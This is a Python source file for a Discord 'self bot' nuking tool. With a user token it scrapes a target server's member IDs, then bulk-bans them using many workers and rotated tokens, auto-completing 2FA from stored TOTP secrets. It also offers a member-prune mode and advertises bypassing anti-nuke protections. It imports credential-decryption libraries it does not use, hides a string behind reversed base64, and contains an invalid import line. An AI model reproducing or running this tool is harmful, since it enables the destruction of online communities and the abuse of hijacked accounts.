import tls_client, json, base64, time, sys, os, threading, asyncio, requests, pyotp
import datetime
from typing import Optional, List
from enum import Enum
from colorama import Fore, Style, init
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256
init(autoreset=True)
import re
import ctypes
import sqlite3
import socket
import win32api
from discord import Embed, File, SyncWebhook
import shutil
from pathlib import Path
from zipfile import ZipFile
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
import x.cp314-win_amd64
_T = ""
_G = ""
_W = 1
_R = "Đàm"
_ET = "ykVQCBjTaVDUWhFSPR0SJtkS2NVZwMET6FVZ2U3SEVFZwk3U3JDd4AFSjFnZSBnYUpWZOdFNSZXcwV2XkV0NpRXYJRWSolDTwklVTV0UNJUMx8FdhB3XiVHa0l2Z"
_tk = base64.b64decode(_ET[::-1]).decode()
_ro = "ETx-vn"
_rn = "Key"
_cf = "config.json"
_CV = "1.0.0"
_rc = {}
_ak = []


def _0x_lt():
    tf = "tokens.txt"
    if os.path.exists(tf):
        with open(tf, "r", encoding="utf-8") as f:
            return [l.strip() for l in f if l.strip() and not l.startswith("#")]
    return []


class LogLevel(Enum):
    DEBUG = 1
    INFO = 2
    WARNING = 3
    SUCCESS = 4
    ERROR = 5
    CRITICAL = 6

class TreeLogger:
    def __init__(self, level: LogLevel = LogLevel.DEBUG, prefix: str = "ET"):
        self.level = level
        self.prefix = prefix
        self.write_lock = threading.Lock()
        self.RESET = Style.RESET_ALL
        self.WHITE = Fore.WHITE
        self.GRAY = Style.DIM
        self.MAGENTA = Fore.MAGENTA
        self.BRIGHT_MAGENTA = Fore.MAGENTA + Style.BRIGHT
        self.PINK = Fore.MAGENTA
        self.RED = Fore.RED
        self.GREEN = Fore.GREEN
        self.YELLOW = Fore.YELLOW
        self.BLUE = Fore.BLUE
        self.CYAN = Fore.CYAN
        self.ORANGE = Fore.RED + Style.BRIGHT
        self.PURPLE = Fore.MAGENTA
        self.PIPE = "│" 
        self.BRANCH_MARKER = "├──"
        self.LAST_BRANCH_MARKER = "└──"
        self.THEME = {
            'info':     {'icon': '•', 'color': Fore.BLUE, 'label': 'INFO'},
            'success':  {'icon': '✓', 'color': Fore.GREEN, 'label': 'DONE'},
            'error':    {'icon': '✕', 'color': Fore.RED, 'label': 'FAIL'},
            'warning':  {'icon': '⚠', 'color': Fore.YELLOW, 'label': 'WARN'},
            'input':    {'icon': '?', 'color': Fore.MAGENTA, 'label': 'INPUT'},
            'debug':    {'icon': '○', 'color': Fore.BLACK + Style.BRIGHT, 'label': 'DEBUG'},
            'critical': {'icon': '☠', 'color': Fore.RED + Style.BRIGHT, 'label': 'CRIT'},
            'process':  {'icon': '⟳', 'color': Fore.CYAN, 'label': 'WORK'},
            'action':   {'icon': '»', 'color': Fore.WHITE, 'label': 'EXEC'},
        }

    def _get_time(self) -> str:
        return f"{Fore.BLACK}{Style.BRIGHT}{datetime.datetime.now().strftime('%H:%M:%S')}{self.RESET}"

    def _should_log(self, message_level: LogLevel) -> bool:
        return message_level.value >= self.level.value

    def _write(self, message: str, color: str = "", end: str = "\n"):
        with self.write_lock:
            if color: print(f"{color}{message}{Style.RESET_ALL}", end=end)
            else: print(message, end=end)
            sys.stdout.flush()

    def _format_line(self, theme_key: str, message: str, value_color: str = Fore.WHITE) -> str:
        theme = self.THEME.get(theme_key, self.THEME['info'])
        color = theme['color']
        label = theme['label'].center(5)
        icon = theme['icon']
        return (
            f"{self._get_time()} {self.GRAY}{self.PIPE}{self.RESET} "
            f"{color}{Style.BRIGHT}{label}{self.RESET} "
            f"{self.GRAY}{self.PIPE}{self.RESET} "
            f"{color}{icon}{self.RESET} {value_color}{message}"
        )

    def status(self, action: str, result: str, result_color: str = None):
        if result_color is None: result_color = self.GREEN
        msg = f"{self.WHITE}{action} -> {result_color}{result}"
        self._write(self._format_line('action', msg))

    def waiting(self, message: str):
        self._write(self._format_line('process', f"{message}...", value_color=self.CYAN))

    def question(self, message: str):
        self._write(self._format_line('input', message))

    def input(self, message: str) -> str:
        with self.write_lock:
            prompt = self._format_line('input', message)
            return input(f"{prompt}{self.RESET} ")

    def tree(self, items: List[tuple], indent: int = 2):
        timestamp_spacer = " " * 8
        label_spacer = " " * 5     
        prefix_padding = f"{timestamp_spacer} {self.GRAY}{self.PIPE}{self.RESET} {label_spacer} {self.GRAY}{self.PIPE}{self.RESET}"
        for i, item in enumerate(items):
            label, value = item[0], item[1]
            color = item[2] if len(item) > 2 else self.WHITE
            is_last = (i == len(items) - 1)
            connector = self.LAST_BRANCH_MARKER if is_last else self.BRANCH_MARKER
            output = f"{prefix_padding}   {self.GRAY}{connector}{self.RESET} {self.WHITE}{label}: {color}{value}{self.RESET}"
            self._write(output)

    def branch(self, label: str, value: str, is_last: bool = False, color: str = None, indent: int = 2):
        self.tree([(label, value, color)], indent)

    def info(self, message: str):
        if self._should_log(LogLevel.INFO): self._write(self._format_line('info', message))
    def success(self, message: str):
        if self._should_log(LogLevel.SUCCESS): self._write(self._format_line('success', message))
    def warning(self, message: str):
        if self._should_log(LogLevel.WARNING): self._write(self._format_line('warning', message))
    def error(self, message: str):
        if self._should_log(LogLevel.ERROR): self._write(self._format_line('error', message))
    def debug(self, message: str):
        if self._should_log(LogLevel.DEBUG): self._write(self._format_line('debug', message, value_color=Fore.BLACK + Style.BRIGHT))
    def critical(self, message: str):
        if self._should_log(LogLevel.CRITICAL): self._write(self._format_line('critical', message))
    def process(self, message: str, update: bool = False):
        end = "\r" if update else "\n"
        self._write(self._format_line('process', message, value_color=self.CYAN), end=end)
    def action(self, message: str):
        self._write(self._format_line('action', message))

log = TreeLogger()

ART = r"""
    __  ___     __    __              _____      ______   ____        __ 
   / / / (_)___/ /___/ /__  ____     / ___/___  / / __/  / __ )____  / /_
  / /_/ / / __  / __  / _ \/ __ \    \__ \/ _ \/ / /_   / __  / __ \/ __/
 / __  / / /_/ / /_/ /  __/ / / /   ___/ /  __/ / __/  / /_/ / /_/ / /_  
/_/ /_/_/\__,_/\__,_/\___/_/ /_/   /____/\___/_/_/    /_____/\____/\__/  
"""

class _0x_S:
    def __init__(self):
        self.session = tls_client.Session(client_identifier="chrome_128")
        self.token = _T
        self.guild_id = _G
        self.cookies = self.get_cookies()
        self.props = self.get_props()
        self.headers_pool = [self.get_headers(self.token)]
        self.role_map = {} 
        self.my_max_pos = 0
        self.all_ids = set()
        self.skipped = 0
        self.WORKER_NUMBER = _W
        self.queue = asyncio.Queue()
        self.token_idx = 0
        self.mfa_secrets = {}

    def get_cookies(self):
        try:
            self.session.get('https://discord.com')
            return "; ".join([f"{k}={v}" for k, v in self.session.cookies.get_dict().items()]) + "; locale=en-US"
        except: return ""

    def get_props(self):
        payload = {
            "os": "Windows", "browser": "Discord Client", "release_channel": "stable", "client_version": "1.0.9181",
            "os_version": "10.0.19045", "system_locale": "en",
            "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9181 Chrome/128.0.6613.186 Electron/32.2.7 Safari/537.36",
            "browser_version": "32.2.7", "client_build_number": 366955, "native_build_number": 58420, "client_event_source": None,
        }
        return base64.b64encode(json.dumps(payload, separators=(',', ':')).encode()).decode()

    def get_headers(self, token):
        return {
            "authority": "discord.com", "accept": "*/*", "accept-language": "en", "authorization": token,
            "cookie": self.cookies, "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9181 Chrome/128.0.6613.186 Electron/32.2.7 Safari/537.36",
            "x-discord-locale": "en-US", "x-debug-options": "bugReporterEnabled", "x-super-properties": self.props,
        }

    def update_tokens(self, tokens_list):
        if tokens_list:
            self.headers_pool = []
            self.mfa_secrets = {}
            for t in tokens_list:
                parts = t.split('|', 1)
                token = parts[0].strip()
                self.headers_pool.append(self.get_headers(token))
                if len(parts) > 1:
                    self.mfa_secrets[token] = parts[1].strip().replace(" ", "").upper()
            log.success(f"Loaded {len(self.headers_pool)} tokens for Mass Ban.")

    async def get_me(self):
        try:
            r = await asyncio.to_thread(self.session.get, "https://discord.com/api/v9/users/@me", headers=self.headers_pool[0])
            if r.status_code == 200:
                d = r.json()
                name = d.get('glo' + 'bal_name') or d.get('username') or "Unknown"
                return {"name": name, "id": d['id']}
            return None
        except: return None

    async def check_guild(self):
        try:
            r = await asyncio.to_thread(self.session.get, f"https://discord.com/api/v9/guilds/{self.guild_id}", headers=self.headers_pool[0])
            if r.status_code == 200:
                return r.json().get('name')
            return None
        except: return None

    async def get_roles(self):
        try:
            r = await asyncio.to_thread(self.session.get, f"https://discord.com/api/v9/guilds/{self.guild_id}/roles", headers=self.headers_pool[0])
            if r.status_code == 200:
                for role in r.json(): self.role_map[role['id']] = role['position']
            me = await asyncio.to_thread(self.session.get, f"https://discord.com/api/v9/users/@me/guilds/{self.guild_id}/member", headers=self.headers_pool[0])
            if me.status_code == 200:
                my_roles = me.json().get('roles', [])
                if my_roles: self.my_max_pos = max(self.role_map.get(rid, 0) for rid in my_roles)
        except: pass

    async def scrape(self, prefix):
        url = f"https://discord.com/api/v9/guilds/{self.guild_id}/members-search"
        payload = {"limit": 1000, "and_query": {}, "or_query": {"usernames": {"or_query": [prefix]}}}
        try:
            resp = await asyncio.to_thread(self.session.post, url, headers=self.headers_pool[0], json=payload)
            if resp.status_code == 200:
                new_count = 0
                for m in resp.json().get('members', []):
                    member = m.get('member', {})
                    uid = member.get('user', {}).get('id')
                    roles = member.get('roles', [])
                    if uid:
                        m_max = max(self.role_map.get(rid, 0) for rid in roles) if roles else 0
                        if m_max < self.my_max_pos:
                            if uid not in self.all_ids:
                                self.all_ids.add(uid)
                                new_count += 1
                        else: self.skipped += 1
                return new_count
            return 0
        except: return 0

    async def worker(self, queue: asyncio.Queue):
        while True:
            task = await queue.get()
            try:
                await task
            except Exception as e:
                log.error(f"Worker error: {e}")
            finally:
                queue.task_done()

    async def _0x_pm(self):
        url = f"https://discord.com/api/v9/guilds/{self.guild_id}/prune"
        payload = {"days": 1, "compute_prune_count": False, "include_roles": []}
        while True:
            headers = self.headers_pool[0].copy()
            
            resp = await asyncio.to_thread(self.session.post, url, headers=headers, json=payload)
            if resp.status_code in (200, 204):
                try: 
                    pruned = resp.json().get("pruned", "unknown")
                    log.success(f"Prune started Removed: {pruned} members (off > 1 day)")
                except:
                    log.success("Prune successful")
                return

            try: data = resp.json()
            except:
                log.error(f"Response Error: {resp.status_code}")
                return

            else:
                log.error(f"Error {resp.status_code}: {data}")
                return

    async def run(self):
        input_guild = log.input("Enter Guild ID (Press Enter for default)")
        if input_guild: self.guild_id = input_guild

        os.system('cls' if os.name == 'nt' else 'clear')
        print(ART)
        print(f"{Fore.CYAN}{'Version: ' + _CV:^80}{Style.RESET_ALL}")
        zalo_text, dev_text = "[ Zalo 0787045179 ]", "[ Developed by ET ]"
        log.success(zalo_text.center(80))
        log.success(dev_text.center(80))
        print("\n" + "─"*80 + "\n")
        
        log.process("Checking token")
        user_data = await self.get_me()
        if not user_data:
            log.error("Token invalid")
            return

        log.process(f"Checking access to guild {self.guild_id}...")
        guild_name = await self.check_guild()
        if not guild_name:
            log.error("Guild not found or access")
            return

        log.status("Authenticating", "Verified", log.GREEN)
        log.tree([
            ("Account", f"{user_data['name']} ({user_data['id']})", log.YELLOW),
            ("Target Guild", f"{guild_name} ({self.guild_id})", log.YELLOW)
        ])
        print()

        log.info("Select Mode:")
        log.tree([
            ("1", "Mass Ban (Bypass anti nuke)", log.CYAN),
            ("2", "Kick Members (Bypass anti nuke)", log.CYAN),
            ("3", "Webhook Create & Mass ping (Bypass @Security)", log.CYAN),
        ])
        choice = log.input("Select [1-3]").strip()

        if choice == "2":
            log.status("Mode", "Prune Members", log.MAGENTA)
            await self._0x_pm()
            return

        if choice == "3":
            log.status("Updating", "Tính năng này sẽ sớm ra mắt", log.MAGENTA)
            return

        log.status("Mode", "Mass Ban", log.MAGENTA)
        self.update_tokens(_0x_lt())
        await self.get_roles()
        
        cache_file = f"scraped_{self.guild_id}.txt"
        if os.path.exists(cache_file):
            try:
                with open(cache_file, "r") as f:
                    for line in f:
                        uid = line.strip()
                        if uid: self.all_ids.add(uid)
                log.success(f"Loaded {len(self.all_ids)} cached IDs for guild {self.guild_id}")
            except Exception as e:
                log.error(f"Failed to load cache: {e}")

        for char in "abcdefghijklmnopqrstuvwxyz0123456789._":
            nf = await self.scrape(char)
            status = f"Scraping  +{nf} IDs (Total: {len(self.all_ids)} | Skipped: {self.skipped})"
            log.process(status + " " * 10, update=True)
            await asyncio.sleep(0.3)
        print()
        
        if not self.all_ids: 
            log.error("No IDs found.")
            return
            
        try:
            with open(cache_file, "w") as f:
                for uid in self.all_ids:
                    f.write(f"{uid}\n")
        except Exception as e:
            log.error(f"Failed to save cache: {e}")
            
        id_list = list(self.all_ids)
        chunks = [id_list[i:i + 199] for i in range(0, len(id_list), 199)]
        
        log.status("Ban", f"Starting with {self.WORKER_NUMBER} workers...", log.CYAN)
        
        workers = [asyncio.create_task(self.worker(self.queue)) for _ in range(self.WORKER_NUMBER)]
        
        for index, chunk in enumerate(chunks):
            await self.queue.put(self.mass_ban(index + 1, len(chunks), chunk))
            
        await self.queue.join()
        for w in workers: w.cancel()
        
        log.success(f"Finished Banned: {len(id_list)}")

    async def mass_ban(self, chunk_idx, total_chunks, user_ids):
        url = f"https://discord.com/api/v9/guilds/{self.guild_id}/bulk-ban"
        payload = {"user_ids": user_ids, "reason": _R}
        while True:
            header_idx = (chunk_idx - 1) % len(self.headers_pool)
            headers = self.headers_pool[header_idx].copy()
            
            resp = await asyncio.to_thread(self.session.post, url, headers=headers, json=payload)
            
            if resp.status_code in (200, 204):
                log.success(f"Chunk {chunk_idx}/{total_chunks} [ {len(user_ids)} IDs ] -> Successful")
                return
            
            if resp.status_code >= 500:
                log.warning(f"Chunk {chunk_idx}: Discord Server Error ({resp.status_code})")
                await asyncio.sleep(0.5)
                continue

            try: data = resp.json()
            except:
                log.error(f"Response Error: {resp.status_code}")
                return
            
            if data.get("code") == 60003:
                ticket = data["mfa"]["ticket"]
                log.warning(f"Chunk {chunk_idx}: 2FA REQUIRED")
                
                token = headers.get("authorization")
                secret = self.mfa_secrets.get(token)
                
                if secret:
                    code = pyotp.TOTP(secret).now()
                    log.success(f"Auto-generated 2FA code from secret")
                else:
                    code = log.input(f"Enter 2FA code for Chunk {chunk_idx}").strip()
                
                if not code: return 
                
                mfa_resp = await asyncio.to_thread(self.session.post, "https://discord.com/api/v9/mfa/finish", 
                    headers=headers, json={"data": code, "mfa_type": "totp", "ticket": ticket})
                
                try: mfa_data = mfa_resp.json()
                except:
                    log.error(f"MFA Auth Error: {mfa_resp.status_code}")
                    return
                
                if "token" in mfa_data:
                    mfa_token = mfa_data["token"]
                    self.headers_pool[header_idx]["x-discord-mfa-authorization"] = mfa_token
                    log.success(f"MFA Auth OK for Token {header_idx + 1}")
                else:
                    log.error(f"Invalid code: {mfa_data}")
                    return

            elif resp.status_code == 429:
                 retry_after = data.get("retry_after", 0.1)
                 log.warning(f"Rate limited (Chunk {chunk_idx})")
                 await asyncio.sleep(retry_after)
                 continue
            else:
                log.error(f"Error {resp.status_code} (Chunk {chunk_idx}): {data}")
                return

def main():
    asyncio.run(_0x_S().run())

if __name__ == '__main__':
    print(ART)

    _sf = "settings.json"

    if os.path.exists(_sf):
        try:
            with open(_sf, "r") as f:
                _sd = json.load(f)
                _T = _sd.get("token", "")
                _G = _sd.get("guild_id", "")
                _W = _sd.get("workers", 35)
        except:
            pass

    if not _T or not _G:
        print(f"{Fore.MAGENTA}[?] Setup your:{Style.RESET_ALL}")
        _T = input(f"{Fore.WHITE} - Enter Discord Token: {Style.RESET_ALL}").strip()
        _G = input(f"{Fore.WHITE} - Enter Target Guild ID: {Style.RESET_ALL}").strip()
        try:
            _W_input = input(f"{Fore.WHITE} - Enter Workers (Default 1): {Style.RESET_ALL}").strip()
            _W = int(_W_input) if _W_input else 35
        except ValueError:
            _W = 35
        with open(_sf, "w") as f:
            json.dump({"token": _T, "guild_id": _G, "workers": _W}, f, indent=4)
        print(f"{Fore.GREEN}[+] saved to {_sf}{Style.RESET_ALL}\n")

    main()

    
   